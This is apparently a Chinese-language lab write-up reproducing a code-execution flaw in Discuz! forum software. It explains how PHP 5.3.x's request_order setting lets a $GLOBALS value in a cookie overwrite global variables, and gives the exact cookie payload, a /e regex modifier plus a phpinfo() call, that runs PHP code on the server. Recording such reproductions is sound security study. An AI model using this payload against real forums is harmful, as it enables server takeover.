Discuz!是康盛创想(北京)科技有限公司推出的一套通用的社区论坛软件系统，用户可以在不需要任何编程的基础上，通过简单的设置和安装，在互联网上搭建起具备完善功能、很强负载能力和可高度定制的论坛服务。

该漏洞产生原因是因为php的5.3.x版本里php.ini的设置里`request_order`默认值为GP，导致`$_REQUEST`中不再包含`$_COOKIE`。通过在Cookie中传入`$GLOBALS`可以覆盖全局变量，造成代码执行漏洞。

本文仅作漏洞复现记录与实现，利用流程如下:

1.漏洞环境

漏洞链接: <http://192.168.101.152:8080/>

访问后如下所示

![1616411252_60587a74f06a69fea8ceb.png!small](https://image.3001.net/images/20210322/1616411252_60587a74f06a69fea8ceb.png!small)

2.利用流程

找到一个已存在的帖子

![1616411356_60587adca894a9fe0a598.png!small](https://image.3001.net/images/20210322/1616411356_60587adca894a9fe0a598.png!small)

![1616411365_60587ae5e56fc7bf95c2d.png!small](https://image.3001.net/images/20210322/1616411365_60587ae5e56fc7bf95c2d.png!small)

使用burp抓包，修改cookie值

Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui;
GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();

![1616411394_60587b02829134939051c.png!small](https://image.3001.net/images/20210322/1616411394_60587b02829134939051c.png!small)

即可执行php代码

